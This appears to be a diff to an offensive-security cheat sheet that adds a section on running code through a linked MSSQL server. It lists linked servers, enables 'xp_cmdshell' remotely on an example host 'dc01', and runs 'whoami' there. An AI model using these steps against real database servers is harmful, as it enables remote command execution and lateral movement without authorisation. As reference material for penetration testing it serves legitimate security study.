@@ -41,6 +41,19 @@ Use this commands at this order:
 
 **CODE EXECUTION ON A LINKED MSSQL SERVER:**
 
+To list linked SQL servers(2 ways):
+```
+exec sp_linkedservers;
+
+SELECT * FROM sys.servers;
+```
+For this example, assume that dc01 is the linked server. 
+
+1st ```EXEC (sp_configure 'show advanced options', 1; RECONFIGURE;) AT dc01```
+
+2nd ```EXEC (sp_configure 'xp_cmdshell', 1; RECONFIGURE;) AT dc01```
+
+3rd ```EXEC (xp_cmdshell 'whoami';) AT dc01```
 
 **PRIVILEGE ESCALATION THROUGHA LINKED MSSQLSERVER:**
 
